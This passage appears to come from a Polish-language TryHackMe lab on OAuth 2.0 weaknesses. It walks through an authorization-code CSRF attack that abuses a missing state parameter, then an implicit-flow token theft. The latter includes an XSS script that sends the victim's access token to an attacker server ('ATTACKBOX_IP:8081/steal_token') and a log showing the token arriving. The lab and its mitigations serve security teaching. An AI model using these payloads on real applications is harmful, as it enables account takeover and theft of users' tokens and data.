Z komputera atakującego może on wykorzystać przechwycony kod autoryzacji do wywołania `/callback`punktu końcowego i wymiany go na prawidłowy token dostępu. W przepływie OAuth, jak widzieliśmy wcześniej, `/callback` punkt końcowy jest zawsze dostępny, akceptując parametr kodu i zwracając token dostępu. Dzięki temu tokenowi atakujący uzyskuje nieautoryzowany dostęp do chronionych zasobów użytkownika. Aby uzyskać token dostępu, odwiedź adres URL  [http://bistro.thm:8000/oauthdemo/callbackforflag/?code=xxxxx(otwiera się w nowej karcie)](http://bistro.thm:8000/oauthdemo/callbackforflag/?code=xxxx) i zastąp `code`parametr uzyskanym kodem autoryzacyjnym.

![strona internetowa pokazująca pomyślny token po uzyskaniu kodu autoryzacyjnego](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1721904781930.png)



Parametr **stanu** w ramach OAuth 2.0 chroni przedCSRFAtaki te występują, gdy atakujący podstępem nakłania użytkownika do wykonania niepożądanych działań w aplikacji internetowej, w której jest on obecnie uwierzytelniony. W kontekście OAuth ataki CSRF mogą prowadzić do nieautoryzowanego dostępu do wrażliwych zasobów poprzez przejęcie kontroli nad przepływem OAuth. Parametr stanu pomaga ograniczyć to ryzyko, utrzymując…uczciwośćprocesu autoryzacji.  

Usterka słabego lub brakującego parametru stanu

Parametr stanu to dowolny ciąg znaków, który aplikacja kliencka dołącza do żądania autoryzacji. Gdy serwer autoryzacji przekierowuje użytkownika z powrotem do aplikacji klienckiej z kodem autoryzacji, dołącza również parametr stanu. Aplikacja kliencka weryfikuje następnie, czy parametr stanu w odpowiedzi jest zgodny z tym, który wysłała pierwotnie. Ta walidacja gwarantuje, że odpowiedź nie jest wynikiem ataku CSRF, lecz legalną kontynuacją przepływu OAuth.  

Rozważmy na przykład implementację OAuth, w której parametr stanu jest albo **nieobecny** , albo **przewidywalny** (np. wartość statyczna, taka jak „stan” lub prosty numer sekwencyjny). Atakujący może zainicjować przepływ OAuth i zapewnić złośliwe przekierowanie.TYPPo uwierzytelnieniu użytkownika i autoryzacji aplikacji serwer autoryzacji przekierowuje kod autoryzacji do kontrolowanego przez atakującego adresu URI, zgodnie ze specyfikacją parametru stanu słabego lub brakującego.

Praktyczny

W tym ćwiczeniu zbadamy, jak brak parametru stanu w procesie autoryzacji OAuth może prowadzić do ataków CSRF. Będziesz potrzebować narzędzia AttackBox, aby zrozumieć atak zarówno z perspektywy atakującego, jak i ofiary. Będziemy korzystać z aplikacji, `mycontacts.thm:8080` która umożliwia synchronizację kontaktów z dowolnej platformy.

Przed rozpoczęciem ćwiczenia upewnij się, że wylogowałeś się z dostawcy OAuth jako ofiara, odwiedzając link  `http://coffee.thm:8000/admin/logout`. 

Rozpocznij `AttackBox`, naciskając `Start AttackBox`przycisk u góry tego zadania. Maszyna uruchomi się w widoku podzielonego ekranu. Jeśli maszyna wirtualna nie jest widoczna, użyj niebieskiego przycisku „Pokaż podzielony widok” u góry zadania. Aby ukończyć kolejne ćwiczenie, konieczne będzie dodanie `mycontacts.thm`i `coffee.thm`do pliku.`/etc/hosts`  

**Perspektywa atakującego**

Najpierw odwiedź stronę internetową w AttackBox, korzystając z linku  `http://mycontacts.thm:8080/csrf/index.php`z danymi logowania `attacker:attacker`. Po zalogowaniu zobaczysz stronę umożliwiającą synchronizację kontaktów z [ kontem `CoffeeShopApp`]. Po zsynchronizowaniu kont wszystkie bieżące konta z aplikacji klienckiej zostaną przeniesione na `CoffeeShopApp`konto.

![panel do synchronizacji kontaktów z aplikacją CoffeeshopApp](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1722185769583.png)  

 Po kliknięciu przycisku „ **Synchronizuj kontakty** ” zostaniesz przekierowany do serwera autoryzacji OAuth z adresem URL  `http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http%3A%2F%2Fcoffee.thm%2Fcsrf%2Fcallbackcsrf.php`.

Jako pentester zauważysz, że w adresie URL autoryzacji brakuje parametru stanu, co sugeruje, że możemy użyć tego samego żądania do ataku CSRF. W tym przypadku nie musisz synchronizować swojego konta. Wykorzystajmy tę lukę, aby połączyć **konto zewnętrzne atakującego z kontem ofiary** .

Wykorzystanie podatności

Bez `state`parametru proces autoryzacji jest podatny na ataki CSRF. Atakujący może wykorzystać tę lukę, uzyskując kod autoryzacyjny ofiary i wysyłając go atakującemu. Serwer autoryzacji nie będzie miał możliwości ustalenia, czy kod autoryzacyjny należy do atakującego **,** czy **ofiary,** ani czy żądanie pochodzi od atakującego, czy ofiary.

Przygotowanie ładunku

Aby przygotować ładunek, atakujący musi uzyskać swój kod autoryzacyjny. Można to zrobić, przechwytując proces autoryzacji za pomocą narzędzia takiego jak Burp Suite lub dowolnego innego narzędzia do przechwytywania sieci. Na potrzeby tego ćwiczenia podajemy link: [http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http://coffee.thm:8000/oauthdemo/callbackforcsrf/(otwiera się w nowej karcie)](http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http://coffee.thm:8000/oauthdemo/callbackforcsrf/)Pozwala to na uzyskanie kodu autoryzacyjnego bez konieczności przechodzenia przez proces OAuth. Kod tego procesu jest dość prosty, jak pokazano poniżej:  

```python
def oauth_logincsrf(request):
    app = Application.objects.get(name="ContactApp")
    redirect_uri = request.POST.get("redirect_uri", "http://coffee.thm/csrf/callbackcsrf.php") 
    
    authorization_url = (
        f"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}"
    )
    return redirect(authorization_url)

def oauth_callbackflagcsrf(request):
    code = request.GET.get("code")
    
    if not code:
        return JsonResponse({'error': 'missing_code', 'details': 'Missing code parameter.'}, status=400) 

    if code:
        return JsonResponse({'code': code, 'Payload': 'http://coffee.thm/csrf/callbackcsrf.php?code='+code}, status=400) 
```

Po kliknięciu powyższego łącza w celu uzyskania kodu autoryzacyjnego wraz z danymi uwierzytelniającymi otrzymasz następującą odpowiedź `attacker:tesla@123`.

![strona internetowa do uzyskania kodu autoryzacyjnego i ładunku](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1723546166405.png)  

Powyższy kod autoryzacyjny umożliwiłby każdemu uzyskanie tokena dostępu.  Parametr URL w odpowiedzi to rzeczywisty ładunek, który musimy wysłać ofierze. Skopiuj wartość `Payload` , która zostanie użyta podczas przeprowadzania ataku.

Rozpoczęcie ataku

- Po uzyskaniu kodu autoryzacyjnego atakujący może przygotować ładunek CSRF. Załóżmy, że atakujący wyśle ​​ofiarom e-mail z linkiem, takim jak  `http://bistro.thm:8080/csrf/callbackcsrf.php?code=xxxx`.  
    
- Po otrzymaniu wiadomości e-mail, jeśli ofiara kliknie link lub uruchomi go w przeglądarce (gdzie znajduje się kod autoryzacyjny atakującego), konto OAuth `xxx`atakującego zostanie połączone z kontem ofiary. W efekcie wszystkie kontakty z konta ofiary zostaną przeniesione na konto atakującego.`CoffeeShopApp` 

**Perspektywa ofiary**

- Aby przetestować maszynę wirtualną w praktyce jako ofiara, zaloguj się do aplikacji klienckiej pod  [adresem http://bistro.thm:8080/csrf/(otwiera się w nowej karcie)](http://bistro.thm:8080/csrf/) z danymi uwierzytelniającymi `victim:victim`. Dla celów ćwiczenia, ponieważ kod autoryzacyjny jest unikalny, wykonaj atak atakującego ( **link:http://bistro.thm:8080/csrf/callbackcsrf.php?code=xxxx** ) wklejając go bezpośrednio do przeglądarki.
- Jak wspomniano powyżej, dokładny link wysłany do ofiary to parametr **adresu URL** otrzymany podczas  procesu **przygotowania ładunku** . Po wykonaniu, kod wykona wywołanie w celu pobrania tokena dostępu i wysłania kontaktów/wiadomości na konto atakującego. 

![strona internetowa pokazująca panel i flagę po udanym włamaniu](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1722188695742.png)


W niejawnym przepływie autoryzacji tokeny są zwracane klientowi bezpośrednio za pośrednictwem przeglądarki, bez konieczności pośredniczącego kodu autoryzacyjnego. Ten przepływ jest wykorzystywany głównie przez aplikacje jednostronicowe i jest przeznaczony dla klientów publicznych, którzy nie mogą bezpiecznie przechowywać sekretów klienta. Jednak przepływ ten ma pewne luki w zabezpieczeniach:

Słabości

- **Ujawnienie tokena dostępu w adresie URL** :  Aplikacja przekierowuje użytkownika do punktu końcowego autoryzacji OAuth, który zwraca token dostępu we fragmencie adresu URL. Każdy skrypt uruchomiony na stronie może łatwo uzyskać dostęp do tego fragmentu.
- **Niedostateczna walidacja adresów URI przekierowania** :  Serwer OAuth nie weryfikuje odpowiednio adresów URI przekierowania, co umożliwia potencjalnym atakującym manipulowanie punktem końcowym przekierowania.
- **Brak implementacji protokołu HTTPS** : aplikacja nie wymusza protokołu HTTPS, co może prowadzić do przechwycenia tokena w ramach ataków typu man-in-the-middle.
- **Niewłaściwe przetwarzanie tokenów dostępu** :  Aplikacja przechowuje token dostępu w sposób niezabezpieczony, prawdopodobnie w `localStorage`lub `sessionStorage`, co czyni go podatnym na ataki XSS.

Wycofanie niejawnego przepływu uprawnień

Ze względu na te luki w zabezpieczeniach [najlepsze aktualne praktyki bezpieczeństwa protokołu OAuth 2.0(otwiera się w nowej karcie)](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics) zaleca wycofanie domyślnego przepływu przyznawania uprawnień na rzecz przepływu kodu autoryzacyjnego z  [kluczem dowodowym do wymiany kodu(otwiera się w nowej karcie)](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-pkce)(PKCE). Ten zaktualizowany przepływ zapewnia zwiększone bezpieczeństwo poprzez ograniczenie ryzyka ujawnienia tokena i braku uwierzytelnienia klienta.

Praktyczny

Przed rozpoczęciem ćwiczenia upewnij się, że jesteś wylogowany z dostawcy OAuth jako atakujący, odwiedzając łącze [http://coffee.thm:8000/admin/logout.(otwiera się w nowej karcie)](http://coffee.thm:8000/admin/logout.)

Na dołączonej maszynie wirtualnej odwiedź [link] `http://factbook.thm:8080`, gdzie zobaczysz stronę umożliwiającą synchronizację statusów z [link] `CoffeeShopApp`. Proces autoryzacji rozpocznie się po kliknięciu przycisku „ **Synchronizuj statusy z CoffeeShopApp** ”. Aplikacja kliencka jest skonfigurowana do korzystania z **domyślnego typu uprawnień [link]** , co oznacza, że ​​token dostępu zostanie zwrócony bezpośrednio do klienta. Adres URL autoryzacji jest skonstruowany w następujący sposób:

```javascript
var client_id = 'npmL7WDiRoOvjZoGSDiJhU2ViodTdygjW8rdabt7';
var redirect_uri = 'http://factbook.thm:8080/callback.php'; 
var auth_url = "http://coffee.thm:8000/o/authorize/";
var url = auth_url + "?response_type=token&client_id=" + client_id + "&redirect_uri=" + encodeURIComponent(redirect_uri);
window.location.href = url;
```

Perspektywa ofiary

Po uwierzytelnieniu użytkownika za pomocą danych uwierzytelniających dostawcy OAuth `victim:victim123`zostanie on przekierowany do [strony] `callback.php`, gdzie będzie mógł wprowadzić status. Ta strona zawiera formularz do wprowadzania statusu i przesyłania go za pomocą żądania AJAX:

```php
<button class="btn btn-primary" onclick="submitStatus()">Submit</button>
<h2 class="mt-4">Submitted Status</h2>
<ul class="list-group" id="status-list">
    <?php
    session_start();
    if (isset($_POST['status'])) {
        $status = $_POST['status'];
        if (!isset($_SESSION['statuses'])) {
            $_SESSION['statuses'] = [];
        }
        $_SESSION['statuses'][] = $status;
        header('Content-Type: application/json');
        echo json_encode(['status' => $status]);
        exit();
    }
    // Display previously stored statuses
    if (isset($_SESSION['statuses'])) {
        foreach ($_SESSION['statuses'] as $status) {
            echo '<li class="list-group-item">' . $status . '</li>';
        }
    }
    ?>
</ul>
```

Dla celów demonstracyjnych, pole wprowadzania statusu jest podatne na ataki typu XSS. Po wejściu na stronę statusu i wpisaniu statusu, takiego jak „ **Witaj** ”, zostanie on opublikowany. Jeśli jednak atakujący wykorzysta tę lukę, może wstrzyknąć złośliwy skrypt.

![strona internetowa wyświetlająca pole tekstowe do wprowadzania statusu](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1722107085052.png)

Perspektywa atakującego

Aby przygotować się do ataku, w instancji Attackbox uruchom serwer HTTP Pythona, aby nasłuchiwał na porcie `8081`za pomocą polecenia `python3 -m http.server 8081`. Jeśli pojawi się błąd „ **Port already in use** ”, spróbuj użyć innego numeru portu. Atakujący udostępni ofierze następujący ładunek, który wprowadzi jako status (załóżmy, że wykorzystuje socjotechnikę):

```python
<script>var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1];
    return res;
  }, {});
  var accessToken = result.access_token;
    var img = new Image();
    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
</script>
        
```

Przyjrzyjmy się ładunekowi:

- Ładunek JavaScript rozpoczyna się od wyodrębnienia identyfikatora fragmentu z adresu URL, czyli części adresu URL następującej po `#`symbolu. Usuwa początkowe `#`„using” `substr(1)`, aby uzyskać surowy ciąg fragmentu.
- Ten ciąg jest następnie dzielony przez , `&`aby oddzielić poszczególne pary klucz-wartość. Funkcja `reduce`przetwarza każdą z tych par, dzieląc je dalej przez , `=`aby odizolować klucze i wartości. Te pary klucz-wartość są następnie przechowywane w obiekcie o nazwie result.
- Skrypt wyodrębnia `access_token`wartość z tego obiektu i przypisuje ją do zmiennej `accessToken`. Aby wykraść ten token dostępu, skrypt tworzy nowy obiekt Image i ustawia jego `src`atrybut na adres URL wskazujący na serwer atakującego ( `http://ATTACKBOX_IP:8081/steal_token`), dodając token dostępu jako parametr zapytania.
- Po załadowaniu obrazu następuje wysłanie do serwera atakującego żądania zawierającego w adresie URL skradziony token dostępu, co w efekcie powoduje wysłanie tokena atakującemu. 

Skopiuj i wklej kod na komputerze ofiary w polu wprowadzania statusu. Gdy ofiara odświeży stronę, wykonywany jest ładunek XSS. Kopiuje on token dostępu z fragmentu adresu URL i wysyła go na serwer atakującego pod adresem `http://ATTACKBOX_IP:8081/steal_token`. Atakujący może następnie przechwycić token i wykorzystać go do uzyskania nieautoryzowanego dostępu do konta użytkownika.

**Uwaga:**  Odśwież stronę, aby zobaczyć, co widzi ofiara, i pobrać token.

Terminal

```shell-session
root@ip-10-10-162-175:~# python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.9.2.217 - - [27/Aug/2024 19:30:10] code 404, message File not found
10.9.2.217 - - [27/Aug/2024 19:30:10] "GET /steal_token?token=2aauviER3lUOev8wNmXQ9B4GNUoadE HTTP/1.1" 404 -

```

Typ niejawnego przyznania jest szczególnie podatny na tego typu ataki, ponieważ token dostępu jest widoczny we fragmencie adresu URL, co czyni go dostępnym dla każdego skryptu uruchomionego na stronie. Ta podatność jest jeszcze większa, jeśli aplikacja nie wymusza protokołu HTTPS, co prowadzi do potencjalnego przechwycenia tokena poprzez ataki typu man-in-the-middle.


﻿Oprócz luk omówionych wcześniej, atakujący mogą wykorzystać kilka innych krytycznych słabości w implementacjach OAuth 2.0. Poniżej przedstawiono kilka dodatkowych luk, na które powinni zwrócić uwagę pentesterzy podczas testów penetracyjnych aplikacji.

Niewystarczające wygaśnięcie tokena

Tokeny dostępu o długim lub nieskończonym okresie ważności stanowią poważne zagrożenie bezpieczeństwa. Jeśli atakujący uzyska taki token, będzie mógł uzyskać dostęp do chronionych zasobów bezterminowo. Wdrożenie tokenów dostępu i odświeżania o krótkim okresie ważności pomaga ograniczyć to ryzyko, ograniczając czas, w którym atakujący mogą się ujawnić.

Ataki powtórkowe  

Ataki typu replay polegają na przechwyceniu prawidłowych tokenów i ponownym ich wykorzystaniu w celu uzyskania nieautoryzowanego dostępu. Atakujący mogą wykorzystywać tokeny wielokrotnie bez mechanizmów wykrywania i zapobiegania ich ponownemu użyciu. Implementacja `nonce`wartości i `timestamp`kontroli może pomóc w ograniczeniu ryzyka ataków typu replay, zapewniając, że każdy token zostanie użyty tylko raz.

Niebezpieczne przechowywanie tokenów

Przechowywanie tokenów dostępu i tokenów odświeżania w niezabezpieczony sposób (np. w pamięci lokalnej lub niezaszyfrowanych plikach) może prowadzić do kradzieży tokenów i nieautoryzowanego dostępu. Korzystanie z bezpiecznych mechanizmów przechowywania, takich jak bezpieczne pliki cookie lub zaszyfrowane bazy danych, może chronić tokeny przed dostępem ze strony osób o złych zamiarach.

Ewolucja OAuth 2.1

OAuth 2.1 stanowi najnowszą iterację w ewolucji standardu OAuth, bazując na fundamencie OAuth 2.0, aby wyeliminować jego niedociągnięcia i zwiększyć bezpieczeństwo. Przejście od OAuth 2.0 do OAuth 2.1 było motywowane potrzebą ograniczenia znanych luk w zabezpieczeniach i uwzględnienia najlepszych praktyk, które pojawiły się od czasu opublikowania pierwotnej specyfikacji. OAuth 2.0, choć powszechnie przyjęty, miał kilka obszarów wymagających udoskonalenia, szczególnie w zakresie bezpieczeństwa i interoperacyjności. ![rakieta z OAuth 2.1 pokazująca ewolucję struktury OAuth](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724169664413.png)

**Główne zmiany**

OAuth 2.1 wprowadza kilka kluczowych zmian mających na celu wzmocnienie protokołu.

- Jedną z najważniejszych aktualizacji jest wycofanie protokołu OAuth 2.1 `implicit grant type`, który został zidentyfikowany jako poważne zagrożenie bezpieczeństwa ze względu na ujawnianie tokenów we fragmentach adresów URL. Zamiast tego OAuth 2.1 zaleca przepływ kodu autoryzacyjnego z protokołem PKCE dla klientów publicznych.
- Ponadto OAuth 2.1 nakazuje korzystanie z `state`parametru w celu ochrony przed atakami CSRF. 
- OAuth 2.1 podkreśla również znaczenie `secure handling and storage of tokens`. Odradza przechowywanie tokenów w pamięci lokalnej przeglądarki ze względu na ryzyko ataków XSS i zaleca zamiast tego używanie bezpiecznych plików cookie.
- Ponadto OAuth 2.1 zwiększa interoperacyjność, zapewniając jaśniejsze wytyczne dotyczące `redirect URI validation`uwierzytelniania klienta i walidacji zakresu. 

Podsumowując, OAuth 2.1 bazuje na OAuth 2.0, eliminując luki w zabezpieczeniach i wdrażając najlepsze praktyki, aby zapewnić bezpieczniejszą i bardziej chronioną strukturę autoryzacji.  Aby uzyskać szczegółowe informacje na temat OAuth 2.1, zapoznaj się z oficjalną specyfikacją dostępną [tutaj.(otwiera się w nowej karcie)](https://oauth.net/2.1/).


Podsumowując, ta sala poświęcona OAuth zapewniła szczegółowe zrozumienie OAuth 2.0 i jego znaczenia we współczesnych aplikacjach internetowych. Omówiliśmy podstawowe koncepcje niezbędne do zrozumienia OAuth, w tym różne **typy uprawnień** i **przepływ OAuth** . Następnie omówiliśmy, jak **identyfikować usługi OAuth** w aplikacji internetowej.

Podczas ćwiczeń praktycznych wykorzystaliśmy różne luki w zabezpieczeniach związane z OAuth 2.0, w tym słabe implementacje `implicit grant flow`, skutki niezarządzania `redirect_uri`oraz brak dostępności parametru zakresu. Ćwiczenia te uwypukliły krytyczną naturę zabezpieczania implementacji OAuth i potencjalne ryzyko wynikające z typowych błędów konfiguracji.

Na koniec przeanalizowaliśmy inne luki w zabezpieczeniach i omówiliśmy ewolucję OAuth 2.1, podkreślając jego udoskonalenia i sposób, w jaki eliminuje on niedociągnięcia OAuth 2.0. Ta sala wyposażyła Cię w wiedzę niezbędną do identyfikowania i ograniczania ryzyka związanego z OAuth z perspektywy pentestera i programisty bezpieczeństwa.

Daj nam znać, co myślisz o tym pokoju na naszym  [Discordzie (otwiera się w nowej karcie)](https://discord.com/invite/tryhackme)kanał lub  [konto X(otwiera się w nowej karcie)](https://twitter.com/RealTryHackMe)Do zobaczenia.